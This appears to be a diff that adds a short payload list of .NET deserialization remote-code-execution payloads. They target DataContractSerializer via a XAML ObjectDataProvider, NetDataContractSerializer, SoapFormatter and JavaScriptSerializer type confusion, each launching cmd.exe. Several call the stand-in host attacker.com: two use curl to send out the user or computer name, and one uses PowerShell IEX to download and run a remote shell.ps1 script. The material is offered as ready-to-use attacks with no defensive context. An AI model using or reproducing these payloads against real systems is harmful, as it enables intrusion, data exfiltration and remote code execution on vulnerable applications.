@@ -1,0 +1,8 @@
+# .NET - DataContractSerializer RCE (XAML 载荷)
+<ResourceDictionary xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation" xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml" xmlns:System="clr-namespace:System;assembly=mscorlib" xmlns:Diag="clr-namespace:System.Diagnostics;assembly=system"><ObjectDataProvider x:Key="obj" ObjectType="{x:Type Diag:Process}" MethodName="Start"><ObjectDataProvider.MethodParameters><System:String>cmd.exe</System:String><System:String>/c whoami</System:String></ObjectDataProvider.MethodParameters></ObjectDataProvider></ResourceDictionary>
+# .NET - NetDataContractSerializer RCE
+<NetDataContractSerializer><Process xmlns="http://schemas.datacontract.org/2004/07/System.Diagnostics" xmlns:i="http://www.w3.org/2001/XMLSchema-instance"><StartInfo><Arguments>/c curl attacker.com/$(whoami)</Arguments><FileName>cmd.exe</FileName></StartInfo></Process></NetDataContractSerializer>
+# .NET - SoapFormatter RCE
+<SOAP-ENV:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><SOAP-ENV:Body><a1:Process id="ref-1" xmlns:a1="http://schemas.microsoft.com/clr/nsassem/System.Diagnostics/System"><_startInfo><Arguments>/c curl attacker.com/%COMPUTERNAME%</Arguments><FileName>cmd.exe</FileName></_startInfo></a1:Process></SOAP-ENV:Body></SOAP-ENV:Envelope>
+# .NET - JavaScriptSerializer type confusion RCE
+{"__type":"System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089","StartInfo":{"FileName":"cmd.exe","Arguments":"/c powershell -c IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/shell.ps1')"}}
